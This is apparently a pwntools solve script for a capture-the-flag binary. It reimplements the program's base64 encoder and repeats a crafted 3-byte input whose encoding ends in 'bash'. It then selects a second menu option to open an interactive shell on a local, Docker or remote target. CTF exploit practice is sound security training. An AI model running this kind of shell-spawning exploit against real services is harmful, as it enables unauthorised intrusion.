#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('chall')
context.terminal = ['xfce4-terminal', '--title=GDB', '--zoom=0', '--geometry=128x50+1100+0', '-e']
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("172.17.0.2", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/home/chall/chall"]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-gef
brva 0x1605
brva 0x15D1
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()

table = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"

def b64_encode_exact(data: bytes) -> bytes:
    a2 = len(data)
    v14 = 4 * ((a2 + 2) // 3)  # output length
    out = bytearray(v14 + 1)

    v16 = 0  # input index
    v15 = 0  # output index
    
    while v16 < a2:
        # first byte
        v3 = v16
        v16 += 1
        v11 = data[v3]

        # second byte (or 0)
        if v16 >= a2:
            v10 = 0
        else:
            v4 = v16
            v16 += 1
            v10 = data[v4]

        # third byte (or 0)
        if v16 >= a2:
            v7 = 0
        else:
            v6 = v16
            v16 += 1
            v7 = data[v6]

        # make 24-bit block
        v9 = (v11 << 16) | (v10 << 8) | v7

        # write 4 chars
        out[v15]     = table[(v9 >> 18) & 0x3F]
        out[v15 + 1] = table[(v9 >> 12) & 0x3F]
        out[v15 + 2] = table[(v9 >> 6) & 0x3F]
        out[v15 + 3] = table[v9 & 0x3F]
        v15 += 4

    # padding identical to C version
    v12 = a2 % 3
    if v12:
        out[v14 - 1] = ord('=')
        if v12 == 1:
            out[v14 - 2] = ord('=')

    out[v14] = 0  # null terminator (ignored)
    return bytes(out[:-1]) 


def base64_encode(data):
    io.sendlineafter(b">", b"1")
    io.send(data)
    res = io.recvline()
    return res.strip(b"\n")

def solve():

    # chunks = []
    # for i in range(256**3):
    #     raw = i.to_bytes(3, 'big')
    #     enc = b64_encode_exact(raw).decode()

    #     if enc.endswith("bash"):
    #         chunks.append(raw)

    chunk = [b'm\xab!']
    data = chunk[0] * (53 // 3)

    got = True
    while got:
        res = base64_encode(data)
        bit = res.endswith(b"bash")
        if bit == True:
            break
        
    io.sendline(b"2")

    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()